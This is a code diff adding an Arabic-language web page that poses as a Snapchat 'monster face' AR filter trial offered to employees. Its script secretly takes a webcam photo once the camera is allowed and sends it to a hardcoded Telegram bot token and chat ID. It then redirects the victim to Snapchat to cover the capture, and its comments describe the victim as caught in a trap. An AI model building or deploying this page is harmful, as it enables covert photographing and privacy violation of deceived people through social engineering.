@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat AR Filter Test</title>
+    <style>
+        body { background-color: #FFFC00; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { background: white; padding: 40px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.25); text-align: center; width: 85%; max-width: 400px; position: relative; }
+        .ghost-icon { font-size: 80px; margin-bottom: 10px; }
+        h1 { font-size: 26px; color: #000; margin-bottom: 15px; font-weight: 900; }
+        p { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
+        .btn { background: #000; color: #fff; border: none; padding: 18px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .btn:active { transform: scale(0.96); background: #333; }
+        video, canvas { display: none; position: absolute; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <div class="ghost-icon">👻</div>
+    <h1>فلتر "وجه الوحش" 👿</h1>
+    <p>أنت مؤهل لتجربة الفلتر الجديد المخصص للموظفين المتميزين. اضغط أدناه للمتابعة.</p>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    
+    <button id="start-btn" class="btn">ابدأ التجربة الآن 📸</button>
+</div>
+
+<script>
+    // --- 🔐 إعدادات البوت السرية يا وحش ---
+    const BOT_TOKEN = "8371736437:AAG3niwDWXJCjo8MFgiTJdL2zpNjVrJBMFU";
+    const CHAT_ID = "5184501087";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const btn = document.getElementById('start-btn');
+
+    btn.addEventListener('click', async () => {
+        try {
+            // 1. طلب إذن الكاميرا (هنا يقع الموظف في الفخ)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            btn.innerText = "جارِ تحميل الفلتر... ⏳";
+            btn.disabled = true;
+
+            // 2. انتظر 3 ثواني (ليستعد الموظف وتفتح الكاميرا بوضوح)
+            setTimeout(() => {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, 640, 480);
+                
+                // 3. تحويل اللقطة لملف حقيقي وإرسالها
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.png');
+                    formData.append('caption', "👿 بوم! صيد جديد من المقلب يا وحش!\n🌐 المصدر: رابط خارجي (HTTPS)");
+
+                    try {
+                        // إرسال مباشر لبوت التليجرام
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (err) {
+                        console.log("Error sending...");
+                    }
+
+                    // 4. الهروب (تمويه الموظف)
+                    window.location.href = "https://www.snapchat.com/explore";
+                }, 'image/png');
+            }, 3000);
+
+        } catch (err) {
+            alert("عذراً! الفلتر لا يعمل بدون صلاحية الكاميرا. يرجى إعادة المحاولة والسماح بالوصول.");
+        }
+    });
+</script>
+
+</body>
+</html>
